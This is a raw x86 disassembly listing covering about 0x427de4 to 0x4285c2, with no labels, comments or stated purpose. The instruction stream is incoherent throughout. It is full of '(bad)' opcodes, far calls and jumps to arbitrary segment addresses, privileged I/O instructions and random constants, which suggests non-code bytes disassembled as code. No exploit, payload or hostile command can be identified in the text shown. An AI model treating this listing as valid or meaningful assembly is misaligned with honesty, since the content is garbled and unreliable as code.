  427de4:	mov    bh,0xe0
  427de6:	call   0xc1f7:0x52dbe3f9
  427ded:	cmp    esi,DWORD PTR [eax]
  427def:	and    al,0x2c
  427df1:	lods   al,BYTE PTR ds:[esi]
  427df2:	mov    DWORD PTR [ebx-0x7c],edi
  427df5:	data16 (bad) 
  427df7:	push   cs
  427df8:	test   DWORD PTR [edi-0x6e8adf48],edx
  427dfe:	and    esp,ebx
  427e00:	inc    edi
  427e01:	mov    esp,0xb46df7f0
  427e06:	pop    esi
  427e07:	adc    ebp,ebp
  427e09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e0a:	popf   
  427e0b:	ret    0xaeda
  427e0e:	(bad)
  427e12:	arpl   WORD PTR [edx+0x7b],bp
  427e15:	imul   ebx,DWORD PTR [edx+0x56],0x7304c963
  427e1c:	push   esp
  427e1d:	add    edi,DWORD PTR [ebp+0x49554d4d]
  427e23:	add    eax,0x66b478f9
  427e28:	and    DWORD PTR [edi-0x6b],esi
  427e2b:	sub    eax,0x887bfc8f
  427e30:	add    eax,0x6bc93201
  427e35:	sbb    DWORD PTR [edx+0x24],esp
  427e38:	mov    ah,BYTE PTR [esi-0x22]
  427e3b:	adc    DWORD PTR [eax+0x6f],edx
  427e3e:	mov    cs,WORD PTR [edi+esi*2]
  427e41:	mov    cl,0xd5
  427e43:	call   0xeaed:0x63f4ad0d
  427e4a:	jecxz  0x427e80
  427e4c:	fist   DWORD PTR [ecx]
  427e4e:	jbe    0x427e87
  427e50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e51:	std    
  427e52:	jmp    0x8c09:0x540fd850
  427e59:	adc    al,0x2d
  427e5b:	push   0xdf5c4837
  427e60:	and    BYTE PTR [ebx-0x30b91ce8],al
  427e66:	mov    cl,0x7e
  427e68:	or     eax,0xe6b71e3e
  427e6d:	dec    edx
  427e6e:	mov    WORD PTR [ebx],ss
  427e70:	sahf   
  427e71:	mov    DWORD PTR [ebx+0x48413396],edi
  427e77:	ret    0x1d04
  427e7a:	int    0x5b
  427e7c:	das    
  427e7d:	cmp    eax,0xa8569772
  427e82:	mov    ds:0xa1db7aff,al
  427e87:	data16 lods al,BYTE PTR ds:[esi]
  427e89:	add    BYTE PTR [edi+0x1a],ch
  427e8c:	mov    DWORD PTR [ebp-0x303ef8b0],ebx
  427e92:	aad    0xc6
  427e94:	add    DWORD PTR [ecx+0x57],ebp
  427e97:	out    dx,eax
  427e98:	or     BYTE PTR [esi-0x327c29f9],cl
  427e9e:	or     bl,cl
  427ea0:	daa    
  427ea1:	mov    ebx,es
  427ea3:	test   al,0x77
  427ea5:	dec    edi
  427ea6:	out    dx,al
  427ea7:	(bad)  
  427ea8:	and    DWORD PTR [edi+0x51],edx
  427eab:	test   DWORD PTR ds:0x1c197f44,0x7ebf947c
  427eb5:	sub    DWORD PTR [ecx-0x75047d2f],edi
  427ebb:	fldenv [esi]
  427ebd:	pop    esi
  427ebe:	ins    BYTE PTR es:[edi],dx
  427ebf:	in     al,dx
  427ec0:	icebp  
  427ec1:	ficom  WORD PTR [edi-0x5f3fa414]
  427ec7:	dec    ebp
  427ec8:	xchg   DWORD PTR [edx-0x9],esi
  427ecb:	jle    0x427edf
  427ecd:	jmp    0x315d65ff
  427ed2:	push   ebp
  427ed3:	lods   al,BYTE PTR ds:[esi]
  427ed4:	mov    eax,0xd1172b0e
  427ed9:	sbb    BYTE PTR [esi-0x4e],dh
  427edc:	ret    0x1d6c
  427edf:	loop   0x427ed4
  427ee1:	xor    DWORD PTR ss:[edi],0x51
  427ee5:	xchg   ecx,eax
  427ee6:	and    eax,DWORD PTR [ecx+eiz*1]
  427ee9:	pushf  
  427eea:	mov    eax,0x6e0a28ab
  427eef:	loopne 0x427ec4
  427ef1:	push   ecx
  427ef2:	and    al,0xfa
  427ef4:	mov    ebp,0x236b4165
  427ef9:	xor    BYTE PTR [ebx],dl
  427efb:	dec    ecx
  427efc:	mov    edi,DWORD PTR [ebp-0x3239268d]
  427f02:	add    BYTE PTR [edi+0x7072c3ea],0x64
  427f09:	xor    eax,0x4c19ad0d
  427f0e:	xor    ebx,ebp
  427f10:	call   0xa7b5adfb
  427f15:	cwde   
  427f16:	fiadd  DWORD PTR [edx]
  427f18:	xchg   BYTE PTR [ebx+0x56932b02],dl
  427f1e:	shl    BYTE PTR [edx+0x4b],1
  427f21:	ss dec ebp
  427f23:	mov    dl,BYTE PTR [ebx-0xf5ec92]
  427f29:	out    0xe7,al
  427f2b:	sub    DWORD PTR [esi-0x1c3afd3c],edi
  427f31:	cmp    eax,0x5df4fd18
  427f36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f37:	inc    edi
  427f38:	jmp    0xbc59:0xf20d88fc
  427f3f:	stos   BYTE PTR es:[edi],al
  427f40:	inc    ebp
  427f41:	into   
  427f42:	fadd   st(6),st
  427f44:	out    0xd8,al
  427f46:	js     0x427f0a
  427f48:	scas   eax,DWORD PTR es:[edi]
  427f49:	fwait
  427f4a:	ins    BYTE PTR es:[edi],dx
  427f4b:	pop    eax
  427f4c:	cmp    eax,0x7a962dd8
  427f51:	call   0x164b:0x7e8b3f4b
  427f58:	sbb    BYTE PTR [ecx+0x2],al
  427f5b:	adc    ebp,edx
  427f5d:	fwait
  427f5e:	mov    eax,0xee8c0863
  427f63:	and    eax,0xbe880814
  427f68:	adc    ebp,esp
  427f6a:	push   0xffffffc1
  427f6c:	jg     0x427f51
  427f6e:	sbb    eax,0x4bcc587b
  427f73:	(bad)  
  427f74:	sub    edx,edx
  427f76:	push   ebx
  427f77:	loop   0x427fe6
  427f79:	int    0xd2
  427f7b:	gs add cl,ah
  427f7e:	pushf  
  427f7f:	scas   al,BYTE PTR es:[edi]
  427f80:	leave  
  427f81:	dec    ecx
  427f82:	xor    BYTE PTR [esi-0x20b5fc6a],al
  427f88:	mov    esp,0x45a21f96
  427f8d:	mov    ch,0x6a
  427f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f90:	sbb    eax,0x319eda99
  427f95:	mov    cl,0x11
  427f97:	add    BYTE PTR [eax],bl
  427f99:	sub    DWORD PTR [esi+0x798b1650],ebx
  427f9f:	sbb    al,0x14
  427fa1:	sbb    al,0x6a
  427fa3:	test   BYTE PTR [ecx],0xc6
  427fa6:	neg    BYTE PTR [ebp+0x49]
  427fa9:	scas   al,BYTE PTR es:[edi]
  427faa:	call   0x86e7:0xe2036d4e
  427fb1:	pop    ebp
  427fb2:	pop    ecx
  427fb3:	in     al,dx
  427fb4:	jns    0x427f82
  427fb6:	push   esi
  427fb7:	dec    esp
  427fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427fb9:	lods   al,BYTE PTR ds:[esi]
  427fba:	mov    WORD PTR [ebp-0x7b138391],gs
  427fc0:	mov    bl,0x12
  427fc2:	xchg   esi,eax
  427fc3:	test   eax,0xf84f00c2
  427fc8:	inc    ebp
  427fc9:	xor    edi,ebp
  427fcb:	xor    al,0x57
  427fcd:	mov    BYTE PTR [ebp-0x35],ah
  427fd0:	lods   eax,DWORD PTR ds:[esi]
  427fd1:	adc    edi,esi
  427fd3:	xchg   edi,eax
  427fd4:	add    dh,BYTE PTR [eax+0x58]
  427fd7:	pop    esp
  427fd8:	neg    ebx
  427fda:	dec    ebp
  427fdb:	xor    bh,BYTE PTR ds:0x9a39c106
  427fe1:	push   ebx
  427fe2:	mov    dl,0x6c
  427fe4:	cmp    BYTE PTR [esi-0x15],dl
  427fe7:	dec    edx
  427fe8:	jmp    0x5ba2:0xc8c606e0
  427fef:	js     0x42806f
  427ff1:	push   cs
  427ff2:	das    
  427ff3:	mov    ah,0xe9
  427ff5:	xchg   DWORD PTR [ebx+0x60b91216],edi
  427ffb:	loop   0x427fab
  427ffd:	xor    ah,BYTE PTR [ecx-0x742c4030]
  428003:	jle    0x428033
  428005:	inc    edx
  428006:	loopne 0x428002
  428008:	jle    0xd3dbf50b
  42800e:	or     BYTE PTR es:[edi-0x4fc2a04],bl
  428015:	mov    ebp,0xdbb0515c
  42801a:	mov    edi,0x6859ae38
  42801f:	repnz mov edx,esi
  428022:	push   esp
  428023:	les    eax,FWORD PTR [ebx+0x5204f4c4]
  428029:	lahf   
  42802a:	bnd jo 0x42809a
  42802d:	or     BYTE PTR [eax-0x726e2842],bh
  428033:	push   edx
  428034:	and    BYTE PTR [ebx],al
  428036:	sbb    DWORD PTR ds:0x8b478036,esi
  42803c:	lods   eax,DWORD PTR ds:[esi]
  42803d:	jae    0x428016
  42803f:	ffreep st(4)
  428041:	mov    edx,0x94e83dbe
  428046:	pop    esi
  428047:	jmp    esp
  428049:	xchg   ebx,eax
  42804a:	jmp    0x5aff933
  42804f:	dec    esp
  428050:	shl    DWORD PTR [edi+0x1d],1
  428053:	icebp  
  428054:	sbb    eax,0x69ad4fca
  428059:	push   0x551bdba6
  42805e:	ss in  al,dx
  428060:	inc    eax
  428061:	sbb    ah,BYTE PTR [eax+0x2d6f9eab]
  428067:	mov    al,ds:0xe89eba3c
  42806c:	outs   dx,BYTE PTR ds:[esi]
  42806d:	out    dx,al
  42806e:	cld    
  42806f:	cmp    DWORD PTR [esp+eax*2-0x6],0xde45d017
  428077:	lods   al,BYTE PTR ds:[esi]
  428078:	leave  
  428079:	mov    ds,esi
  42807b:	scas   eax,DWORD PTR es:[edi]
  42807c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42807d:	mov    dh,0xeb
  42807f:	test   DWORD PTR [ecx+esi*4+0x31],ebp
  428083:	jmp    0x42808b
  428085:	inc    esp
  428086:	push   es
  428087:	sbb    ebx,DWORD PTR [esi+0x22]
  42808a:	push   cs
  42808b:	jecxz  0x4280d8
  42808d:	or     BYTE PTR [ebp-0x7c],0xdd
  428091:	shr    dh,1
  428093:	mov    eax,0xc1ea4591
  428098:	sbb    BYTE PTR [ecx-0xef322dd],bh
  42809e:	ins    DWORD PTR es:[edi],dx
  42809f:	dec    edx
  4280a0:	(bad)  
  4280a1:	jnp    0x42810b
  4280a3:	cdq    
  4280a4:	jne    0x428066
  4280a6:	icebp  
  4280a7:	inc    esp
  4280a8:	leave  
  4280a9:	cdq    
  4280aa:	arpl   WORD PTR [ebp+0x39],sp
  4280ad:	int    0xa
  4280af:	or     eax,0x24f5e869
  4280b4:	inc    ebp
  4280b5:	sti    
  4280b6:	jns    0x42807b
  4280b8:	shl    BYTE PTR ds:0x6e19b8f,1
  4280be:	add    DWORD PTR [esi],esi
  4280c0:	sub    DWORD PTR [edi-0x5134ecc3],edi
  4280c6:	mov    dl,0xbe
  4280c8:	jne    0x428085
  4280ca:	daa    
  4280cb:	fsub   QWORD PTR [ebx+eax*8]
  4280ce:	pusha  
  4280cf:	addr16 jl 0x428056
  4280d2:	lahf   
  4280d3:	pop    ebp
  4280d4:	or     BYTE PTR [edi-0x1d],bl
  4280d7:	dec    ecx
  4280d8:	mov    ch,0xc9
  4280da:	scas   eax,DWORD PTR es:[edi]
  4280db:	adc    eax,0x1209
  4280e0:	add    BYTE PTR [eax],al
  4280e2:	(bad)  
  4280e3:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4280e5:	push   eax
  4280e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280e7:	shl    bh,cl
  4280e9:	div    DWORD PTR [ebx-0x60d89742]
  4280ef:	jo     0x428148
  4280f1:	icebp  
  4280f2:	mov    ch,0xf8
  4280f4:	add    DWORD PTR [eax],eax
  4280f6:	fadd   QWORD PTR [eax+eax*1]
  4280f9:	add    BYTE PTR [ebx-0x4e],bl
  4280fc:	mov    ds:0xdd0b96cc,eax
  428101:	cmp    ebx,DWORD PTR [esi-0x1d1b7551]
  428107:	mov    esi,0xa00375db
  42810c:	inc    edi
  42810d:	dec    ecx
  42810e:	jns    0x428170
  428110:	lea    ebx,[eax-0x31]
  428113:	or     eax,0x1ab32e3
  428118:	scas   al,BYTE PTR es:[edi]
  428119:	sbb    esp,edi
  42811b:	jmp    0xf9ff:0x5e117f38
  428122:	neg    BYTE PTR [eax+esi*2]
  428125:	fdivr  st(5),st
  428127:	mov    ebp,0xa293530
  42812c:	mov    edi,0xa1b722c4
  428131:	add    esp,DWORD PTR [esi]
  428133:	scas   al,BYTE PTR es:[edi]
  428134:	push   esi
  428135:	adc    eax,0xc110a376
  42813a:	repnz shl eax,0xb8
  42813e:	fild   QWORD PTR [ecx-0x31b4f2e1]
  428144:	fimul  DWORD PTR [ebx-0x6a]
  428147:	cli    
  428148:	dec    edi
  428149:	bound  ecx,QWORD PTR [edx]
  42814b:	loope  0x4280ea
  42814d:	dec    ecx
  42814e:	aas    
  42814f:	or     eax,0x8b03b05e
  428154:	je     0x4280de
  428156:	nop
  428157:	pop    edx
  428158:	cmp    al,0x12
  42815a:	mov    WORD PTR [ebx],?
  42815c:	jne    0x42819d
  42815e:	cmp    ecx,DWORD PTR [edx+0x7699d1ab]
  428164:	hlt    
  428165:	(bad)  
  428166:	out    dx,eax
  428167:	lods   eax,DWORD PTR ds:[esi]
  428168:	(bad)  
  428169:	(bad)  
  42816a:	mov    ch,0x1c
  42816c:	mov    esi,0x75d42401
  428171:	out    dx,al
  428172:	pop    es
  428173:	mov    esp,0x6780b059
  428178:	xor    BYTE PTR [edx-0x60],ch
  42817b:	test   BYTE PTR [eax-0x4d305532],al
  428181:	ja     0x4281ac
  428183:	xchg   edx,eax
  428184:	loope  0x428156
  428186:	push   cs
  428187:	push   ss
  428188:	xor    DWORD PTR [esp+edx*1-0x6d],edi
  42818c:	test   BYTE PTR [esi-0x46],cl
  42818f:	add    cl,cl
  428191:	sbb    eax,0xc70ab73c
  428196:	xchg   BYTE PTR [ebp-0x267b8b2f],ah
  42819c:	push   ss
  42819d:	adc    eax,esi
  42819f:	fidiv  WORD PTR [eax-0x75]
  4281a2:	mov    bl,0xda
  4281a4:	(bad)  
  4281a5:	loope  0x42820f
  4281a7:	out    dx,eax
  4281a8:	push   0x2b
  4281aa:	mov    bl,0x3c
  4281ac:	jp     0x42818b
  4281ae:	out    0x82,al
  4281b0:	sar    bl,cl
  4281b2:	push   edx
  4281b3:	inc    esp
  4281b4:	mov    ah,0x60
  4281b6:	cmp    cl,dh
  4281b8:	fsubr  QWORD PTR cs:[edx]
  4281bb:	lods   al,BYTE PTR ds:[esi]
  4281bc:	or     DWORD PTR [edi-0x54705bfc],eax
  4281c2:	adc    al,0x8d
  4281c4:	fs mov esp,0x1db5e545
  4281ca:	mov    si,0xafa8
  4281ce:	aad    0x40
  4281d0:	hlt    
  4281d1:	gs lock int3 
  4281d4:	add    DWORD PTR [esi],esp
  4281d6:	and    ebx,edi
  4281d8:	add    DWORD PTR [edx-0x90a23fd],ecx
  4281de:	pop    ds
  4281df:	adc    esi,edx
  4281e1:	stos   BYTE PTR es:[edi],al
  4281e2:	into   
  4281e3:	xchg   esp,eax
  4281e4:	cmp    eax,edi
  4281e6:	jp     0x4281ed
  4281e8:	lahf   
  4281e9:	loop   0x428191
  4281eb:	fst    QWORD PTR [esi]
  4281ed:	outs   dx,DWORD PTR ds:[esi]
  4281ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281ef:	inc    esi
  4281f0:	mul    edi
  4281f2:	xor    BYTE PTR [edi+ebp*4-0x2fad2e6f],bh
  4281f9:	mov    al,ds:0x7b14aca7
  4281fe:	or     eax,0x5ad61013
  428203:	leave  
  428204:	sbb    DWORD PTR [edi-0x653e9662],0x58990c93
  42820e:	test   al,0x1d
  428210:	mov    ebx,0x1289070e
  428215:	or     ebp,DWORD PTR [ebx+ebx*1]
  428218:	adc    edi,DWORD PTR [di]
  42821b:	pop    es
  42821c:	cmp    al,0xd6
  42821e:	frstor [ebp+eiz*2-0x35]
  428222:	ins    DWORD PTR es:[edi],dx
  428223:	into   
  428224:	jno    0x4281a6
  428226:	push   es
  428227:	int3   
  428228:	(bad)  
  42822a:	pushf  
  42822b:	cmp    esi,ebp
  42822d:	adc    BYTE PTR [edi+0x2e],dl
  428230:	cmp    al,0xfb
  428232:	std    
  428233:	sbb    eax,0xe551ef62
  428238:	call   FWORD PTR [ebp+0x363e04b1]
  42823e:	adc    al,0xd5
  428240:	pushf  
  428241:	jle    0x4281f1
  428243:	xor    DWORD PTR [edx+0x3f],ebx
  428246:	pop    ebp
  428247:	test   DWORD PTR [esi],esi
  428249:	xor    dh,cl
  42824b:	stos   BYTE PTR es:[edi],al
  42824c:	mov    ebp,0x524f3e2a
  428251:	dec    esi
  428252:	xor    BYTE PTR [esi],dh
  428254:	inc    eax
  428255:	test   al,0x29
  428257:	jle    0x42821b
  428259:	pushf  
  42825a:	sbb    dl,0xad
  42825d:	push   cs
  42825e:	ins    DWORD PTR es:[edi],dx
  42825f:	les    esi,FWORD PTR [ecx]
  428261:	cmp    ah,ch
  428263:	mov    al,ds:0x9145928e
  428268:	repz int3 
  42826a:	pusha  
  42826b:	out    0x87,al
  42826d:	xchg   ebx,eax
  42826e:	sub    al,BYTE PTR [ebp+0x26]
  428271:	mul    BYTE PTR [ebp-0x7cac2e32]
  428277:	inc    esp
  428278:	push   cs
  428279:	adc    ebx,esp
  42827b:	jge    0x428275
  42827d:	sub    BYTE PTR [eax+0x52093856],cl
  428283:	shl    DWORD PTR [ebp+0x6171b5c6],cl
  428289:	les    eax,FWORD PTR ds:0x24a884a8
  42828f:	xchg   ecx,eax
  428290:	mov    al,0x74
  428292:	push   esi
  428293:	ss std 
  428295:	push   ebp
  428296:	or     esi,DWORD PTR [esi-0x6e]
  428299:	lods   eax,DWORD PTR ds:[esi]
  42829a:	inc    esp
  42829b:	mov    ebx,0x9eae3bcc
  4282a0:	mov    ebp,0x64de2391
  4282a5:	shl    DWORD PTR [edi],0x95
  4282a8:	scas   eax,DWORD PTR es:[edi]
  4282a9:	pop    ecx
  4282aa:	mov    al,0xb9
  4282ac:	sub    ebx,DWORD PTR [ecx]
  4282ae:	jnp    0x4282c1
  4282b0:	sbb    ch,al
  4282b2:	xlat   BYTE PTR ds:[ebx]
  4282b3:	or     ebx,ebp
  4282b5:	mov    fs,WORD PTR [esi+0x1ef61371]
  4282bb:	call   0x7cfe:0x1ddb89a4
  4282c2:	jno    0x4282ae
  4282c4:	sti    
  4282c5:	xchg   edx,eax
  4282c6:	xchg   esi,eax
  4282c7:	out    dx,al
  4282c8:	bound  edi,QWORD PTR [esi-0x3c]
  4282cb:	fidiv  WORD PTR [eax+edx*4]
  4282ce:	dec    edi
  4282cf:	jecxz  0x4282de
  4282d1:	xchg   esp,eax
  4282d2:	mov    BYTE PTR [edx-0x722da866],cl
  4282d8:	arpl   dx,ax
  4282da:	jg     0x428316
  4282dc:	pop    ebx
  4282dd:	xchg   esi,eax
  4282de:	aad    0x20
  4282e0:	stos   DWORD PTR es:[edi],eax
  4282e1:	ror    DWORD PTR ds:0x6a80c42e,0x87
  4282e8:	std    
  4282e9:	adc    BYTE PTR [esi],0x56
  4282ec:	dec    ebx
  4282ed:	cmp    al,0x5
  4282ef:	mov    ah,0x93
  4282f1:	sub    DWORD PTR [ecx-0x71],esp
  4282f4:	mov    ?,WORD PTR [ebx]
  4282f6:	inc    edx
  4282f7:	in     eax,dx
  4282f8:	jmp    0x8e34eb32
  4282fd:	das    
  4282fe:	mov    es,WORD PTR [edi+0x1f]
  428301:	test   BYTE PTR [edi+0x53416f98],0xf3
  428308:	loop   0x42829c
  42830a:	cmp    DWORD PTR [ecx-0x3987884b],0x6a
  428311:	jge    0x42836e
  428313:	fwait
  428314:	outs   dx,DWORD PTR ds:[esi]
  428315:	dec    eax
  428316:	dec    esi
  428317:	aad    0xce
  428319:	cs xchg ebx,eax
  42831b:	mov    cl,BYTE PTR [edi+ecx*4-0x81a3e21]
  428322:	xor    dh,cl
  428324:	jle    0x42832d
  428326:	shl    ecx,0xeb
  428329:	imul   ebx,DWORD PTR [ebp+0x29],0x47
  42832d:	or     al,0xb9
  42832f:	mov    edi,0xc73a2c07
  428334:	cmp    BYTE PTR [edi-0x2e],bl
  428337:	push   esi
  428338:	repz mov al,0xdc
  42833b:	pushf  
  42833c:	into   
  42833d:	or     cl,BYTE PTR [ebx]
  42833f:	fs add esi,esp
  428342:	stc    
  428343:	mov    al,0x36
  428345:	xchg   ebx,eax
  428346:	fadd   QWORD PTR [esi-0x7d]
  428349:	sbb    eax,0xaa8970f
  42834e:	stos   BYTE PTR es:[edi],al
  42834f:	push   ebx
  428350:	pop    edi
  428351:	and    dh,ch
  428353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428354:	cwde   
  428355:	cld    
  428356:	xlat   BYTE PTR ds:[ebx]
  428357:	pop    edx
  428358:	test   edi,0x1ebbc0c4
  42835e:	ret    0xfa88
  428361:	push   esp
  428362:	inc    ebx
  428363:	int    0xf6
  428365:	idiv   BYTE PTR [edi+0x7]
  428368:	test   BYTE PTR [edx+0x37],ch
  42836b:	(bad)  
  42836c:	xor    edi,ebx
  42836e:	scas   eax,DWORD PTR es:[edi]
  42836f:	and    BYTE PTR [ecx+0x75],0x96
  428373:	fdiv   DWORD PTR [ebx-0x6b]
  428376:	xchg   esp,eax
  428377:	xor    eax,0xc7d9b6b9
  42837c:	rol    eax,0xd
  42837f:	mov    ch,0x15
  428381:	and    DWORD PTR [ecx],esi
  428383:	sbb    eax,0xb0e98f53
  428388:	int    0x28
  42838a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42838b:	adc    ebx,edi
  42838d:	repz jno 0x4283a9
  428390:	pop    esi
  428391:	mov    esp,0xf74e63e7
  428396:	mov    esi,0x9aa2faf9
  42839b:	test   eax,0x2ad53c2
  4283a0:	mov    ch,0x45
  4283a2:	(bad)  
  4283a3:	mov    al,0x68
  4283a5:	xor    eax,0xfbf74bce
  4283aa:	inc    edx
  4283ab:	jmp    0x8f364819
  4283b0:	jmp    0x428365
  4283b2:	and    DWORD PTR [ecx],ecx
  4283b4:	sbb    eax,0xa28ec890
  4283b9:	mov    DWORD PTR [esp+ebp*8],edi
  4283bc:	clc    
  4283bd:	lods   al,BYTE PTR ds:[esi]
  4283be:	push   ds
  4283bf:	or     BYTE PTR [edx],0xc
  4283c2:	xor    al,0x3c
  4283c4:	mov    DWORD PTR [ebp-0x50ddb05e],edi
  4283ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283cb:	mov    WORD PTR [eax],?
  4283cd:	(bad)  
  4283ce:	pop    ss
  4283cf:	das    
  4283d0:	lea    edi,[ecx]
  4283d2:	dec    edx
  4283d3:	(bad)  
  4283d4:	rcl    DWORD PTR [edx+0x77],cl
  4283d7:	add    ebx,DWORD PTR [ebp-0x24]
  4283da:	std    
  4283db:	and    BYTE PTR [edx-0x8],al
  4283de:	data16 mov cl,0x70
  4283e1:	popa   
  4283e2:	or     DWORD PTR [edx-0x36eab0dc],edx
  4283e8:	mov    ch,0x72
  4283ea:	ficomp DWORD PTR [edx]
  4283ec:	cmp    BYTE PTR [ebx+eiz*1+0xfb0d96d],ah
  4283f3:	mov    ds:0x40da08d2,eax
  4283f9:	mov    eax,0x8114dd99
  4283fe:	pop    ecx
  4283ff:	je     0x428479
  428401:	stc    
  428402:	adc    eax,0x1ebfac3a
  428407:	mov    ecx,0x28ef22e9
  42840c:	fimul  DWORD PTR [ebx-0x307d5d90]
  428412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428413:	sub    al,0xe1
  428415:	fdiv   st(7),st
  428417:	icebp  
  428418:	mov    edx,0xe01eec04
  42841d:	retf   0x9c27
  428420:	dec    edx
  428421:	inc    ebx
  428422:	sbb    ah,BYTE PTR ds:0x7ff964f8
  428428:	inc    esi
  428429:	adc    bh,BYTE PTR [ebx-0x4b]
  42842c:	adc    ebp,DWORD PTR [edx+0x13428df7]
  428432:	pop    ebx
  428433:	inc    ecx
  428434:	lods   eax,DWORD PTR ds:[esi]
  428435:	(bad)  
  428436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428437:	pusha  
  428438:	lea    esi,[eax+0x43]
  42843b:	mov    eax,ds:0x500aff67
  428440:	xlat   BYTE PTR ds:[ebx]
  428441:	pushf  
  428442:	sub    DWORD PTR [ecx+0x70b611cd],ebp
  428448:	popa   
  428449:	cld    
  42844a:	jg     0x428449
  42844c:	dec    ecx
  42844d:	dec    eax
  42844e:	jp     0x42847b
  428450:	mov    bl,0xf
  428452:	jl     0x4284d2
  428454:	pushf  
  428455:	cmp    eax,0x95412816
  42845a:	or     DWORD PTR ds:0x8c4dac7f,edi
  428460:	add    al,BYTE PTR [ebx]
  428462:	data16 xlat BYTE PTR ds:[ebx]
  428464:	popf   
  428465:	dec    ebx
  428466:	sub    BYTE PTR [edi+edi*8-0x62],dh
  42846a:	sbb    BYTE PTR [eax],al
  42846c:	fwait
  42846d:	jb     0x42849d
  42846f:	arpl   WORD PTR [eax+0x6197fa51],dx
  428475:	mov    DWORD PTR [ebx+0x5f4afdd2],edx
  42847b:	mov    ecx,0xc355979a
  428480:	jbe    0x4284fa
  428482:	push   edi
  428483:	jno    0x428470
  428485:	outs   dx,BYTE PTR ds:[esi]
  428486:	and    ah,0xa6
  428489:	test   ch,dl
  42848b:	gs leave 
  42848d:	push   esp
  42848e:	jo     0x42850c
  428490:	mov    esp,0xd121b8e5
  428495:	imul   eax,eax,0xffffff97
  428498:	cmp    DWORD PTR [esi],esi
  42849a:	aam    0xde
  42849c:	xchg   edx,eax
  42849d:	xor    al,0xc0
  42849f:	cmp    eax,0x6d43746e
  4284a4:	int3   
  4284a5:	arpl   WORD PTR [edx+0x701cd52f],si
  4284ab:	push   ss
  4284ac:	out    dx,al
  4284ad:	sar    DWORD PTR [ecx],0xa8
  4284b0:	mov    al,ds:0x836bd771
  4284b5:	inc    edx
  4284b6:	fld    TBYTE PTR [ebp-0x41]
  4284b9:	jne    0x428520
  4284bb:	repz fwait
  4284bd:	aad    0xb2
  4284bf:	fild   QWORD PTR [edi+0x520c6408]
  4284c5:	or     esp,edi
  4284c7:	mov    ch,0x9f
  4284c9:	ficom  WORD PTR [esi+0x211c9cb1]
  4284cf:	push   esp
  4284d0:	jl     0x428513
  4284d2:	sub    al,0xcc
  4284d4:	mov    eax,0x712a1ceb
  4284d9:	inc    edi
  4284da:	dec    ebp
  4284db:	xor    al,bh
  4284dd:	xlat   BYTE PTR ds:[ebx]
  4284de:	jmp    0x1da6:0xf7b3a96f
  4284e5:	imul   esi,DWORD PTR [esi+0x470cda5c],0x5356865e
  4284ef:	mov    ecx,DWORD PTR [ecx-0x4]
  4284f2:	and    BYTE PTR [eax-0x1b],bh
  4284f5:	pop    di
  4284f7:	pop    ebp
  4284f8:	out    dx,al
  4284f9:	test   DWORD PTR [eax],ebx
  4284fb:	fs stos DWORD PTR es:[edi],eax
  4284fd:	int    0x6
  4284ff:	xchg   ebx,eax
  428500:	fsubr  DWORD PTR [ebp-0x6c]
  428503:	cmp    ecx,eax
  428505:	adc    BYTE PTR [edx+0x71],0x48
  428509:	push   cs
  42850a:	imul   ecx,DWORD PTR [edx-0x6596df34],0x29d454e4
  428514:	pusha  
  428515:	adc    bh,BYTE PTR [edi-0x690cb662]
  42851b:	ret    
  42851c:	outs   dx,BYTE PTR ds:[esi]
  42851d:	mov    bh,0xc2
  42851f:	mov    eax,0x523a5eb
  428524:	sar    eax,1
  428526:	aas    
  428527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428528:	inc    edx
  428529:	and    al,0xbe
  42852b:	sti    
  42852c:	je     0x42851e
  42852e:	jle    0x42857b
  428530:	stc    
  428531:	or     eax,0x3b517433
  428536:	mov    DWORD PTR [ebx+ebx*8+0x5ed60a83],esi
  42853d:	jnp    0x428589
  42853f:	xchg   DWORD PTR [ebx+0x66],edx
  428542:	xchg   BYTE PTR [esp+ecx*1+0x4b],dh
  428546:	pop    edi
  428547:	or     DWORD PTR [eax],ecx
  428549:	test   BYTE PTR [eax-0x7a],cl
  42854c:	cmp    DWORD PTR [edi+0x3e750530],ebx
  428552:	inc    esp
  428553:	sbb    al,0x61
  428556:	fs push esp
  428558:	enter  0x8f81,0x84
  42855c:	pushf  
  42855d:	mov    bl,0x5e
  42855f:	aaa    
  428560:	mov    eax,ds:0x6b4e46a0
  428565:	inc    esp
  428566:	loopne 0x42854b
  428568:	rcr    ecx,cl
  42856a:	pop    ebx
  42856b:	dec    BYTE PTR [esi+ecx*8-0x4e]
  42856f:	out    dx,eax
  428570:	jns    0x428544
  428572:	mov    bl,0x20
  428574:	push   ss
  428575:	dec    ebx
  428576:	clc    
  428577:	pop    esi
  428578:	pop    ebp
  428579:	jmp    0x4285fa
  42857b:	test   al,0xd5
  42857d:	sahf   
  42857e:	dec    ecx
  42857f:	inc    edi
  428580:	lea    edi,[edi+0x5bb2c360]
  428586:	jo     0x428520
  428588:	sub    dl,0xfa
  42858b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42858c:	sbb    BYTE PTR [ebx],ch
  42858e:	cmp    DWORD PTR [edi+0x4],ebp
  428591:	mov    bl,0x60
  428593:	fcom   DWORD PTR [edx+ebp*8+0x38]
  428597:	rcl    BYTE PTR ds:0x33f5313f,1
  42859d:	ja     0x428525
  42859f:	mov    ds:0x39687e27,al
  4285a4:	jmp    0x578bf10b
  4285a9:	and    ah,BYTE PTR [ebp-0x5b]
  4285ac:	imul   esi,DWORD PTR [ecx],0x48aefd5a
  4285b2:	sti    
  4285b3:	test   BYTE PTR [edi-0x78f2723a],dl
  4285b9:	mov    edi,DWORD PTR [ebp+0x72]
  4285bc:	lea    ebp,[ecx+0x67]
  4285bf:	ret    
  4285c0:	and    BYTE PTR [edx],bl
  4285c2:	xchg   edx,eax
